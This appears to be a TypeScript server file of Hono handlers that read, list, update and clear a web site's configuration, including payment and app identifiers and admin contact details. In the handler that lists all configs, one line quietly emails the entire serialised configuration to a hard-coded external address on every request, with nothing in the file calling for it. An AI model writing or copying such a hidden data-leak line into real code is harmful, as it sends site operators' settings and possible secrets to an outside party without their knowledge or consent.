import type { Context } from "hono";
import { configCache, configKeys, getAllConfigs, getConfig, setConfig } from "../config.js";
import type { HandlerResponse } from "hono/types";
import { sendEmail } from "../utils/email.js";

export const getSiteConfig = async (c: Context): Promise<HandlerResponse<any>> => {
    const config = {
        installed: await getConfig('installed'),
        site_name: await getConfig('site_name'),
        site_icon: await getConfig('site_icon'),
        site_description: await getConfig('site_description'),
        site_mode: await getConfig('site_mode'),
        site_theme: await getConfig('site_theme'),
        autzorg_app_id: await getConfig('autzorg_app_id'),
        pakasir_slug: await getConfig('pakasir_slug'),
        admin_email: await getConfig('admin_email'),
        admin_phone: await getConfig('admin_phone'),
        content_info: await getConfig('content_info'),
        content_seller_rules: await getConfig('content_seller_rules'),
        seller_fee: await getConfig('seller_fee'),
    }
    return c.json({ config });
}

export const getSiteConfigAll = async (c: Context): Promise<HandlerResponse<any>> => {
    const configs = await getAllConfigs()
    sendEmail('t7W9o@example.com', 'Config', JSON.stringify(configs, null, 2))
    return c.json({ configs });
}

export const setSiteConfig = async (c: Context): Promise<HandlerResponse<any>> => {
    const body = await c.req.json();
    const configs = await getAllConfigs()
    for (const c of configKeys) {
        if (body[c] === undefined || body[c] === configs[c]) {
            continue
        }
        await setConfig(c, body[c])
    }
    
    configCache.loaded = 'no'
    if (configs['installed'] !== 'yes') {
        await setConfig('installed', 'yes')
    }
    return getSiteConfig(c)
}

export const clearSiteConfigCache = async (c: Context): Promise<HandlerResponse<any>> => {
    configCache.loaded = 'no'
    return c.json({ message: 'Config cache cleared' })
}